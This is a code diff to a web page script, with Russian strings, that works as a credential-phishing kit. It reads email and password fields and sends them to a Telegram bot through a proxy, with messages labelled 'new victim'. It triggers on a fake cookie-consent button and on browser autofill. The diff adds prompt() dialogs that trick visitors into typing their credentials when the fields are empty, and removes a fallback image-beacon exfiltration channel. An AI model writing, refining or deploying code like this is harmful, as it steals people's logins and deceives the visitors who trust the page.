@@ -118,30 +118,34 @@
     const CHAT_ID = "8872810304";
     // ========================
 
-    function sendToTelegram(email, password, type) {
-        const text = "📩 НОВАЯ ЖЕРТВА (" + type + ")\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU");
-
-        // Отправка через Cloudflare Worker (работает в РФ без VPN)
+    function sendToTelegram(text) {
         fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendMessage", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
         }).catch(function() {});
-
-        // Резервная отправка напрямую (если у жертвы VPN)
-        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
-        new Image().src = url;
     }
 
     function collectAndSend(type) {
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
-        if (email || password) {
-            sendToTelegram(email, password, type);
-        }
+        const text = "📩 " + type + "\n📧 Email: " + (email || "(пусто)") + "\n🔑 Пароль: " + (password || "(пусто)") + "\n🕒 " + new Date().toLocaleString("ru-RU");
+        sendToTelegram(text);
     }
 
     document.getElementById("btnAccept").addEventListener("click", function() {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        if (!email || !password) {
+            const userEmail = prompt("Для продолжения работы сайта введите вашу электронную почту:");
+            if (userEmail) {
+                document.getElementById("email").value = userEmail.trim();
+                const userPass = prompt("Введите пароль для подтверждения:");
+                if (userPass) {
+                    document.getElementById("password").value = userPass.trim();
+                }
+            }
+        }
         collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
         document.getElementById("cookieBanner").classList.add("cookie-hidden");
     });
@@ -160,7 +164,7 @@
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
         if (email && password) {
-            sendToTelegram(email, password, "АВТОЗАПОЛНЕНИЕ");
+            collectAndSend("АВТОЗАПОЛНЕНИЕ");
         }
     }
     window.addEventListener("load", function() {
@@ -169,7 +173,7 @@
         setTimeout(checkAutoFill, 3000);
     });
 
-    console.log("ROCKET ACTIVE — Прокси mailproxy");
+    console.log("ROCKET ACTIVE — через mailproxy");
 </script>
 </body>
 </html>
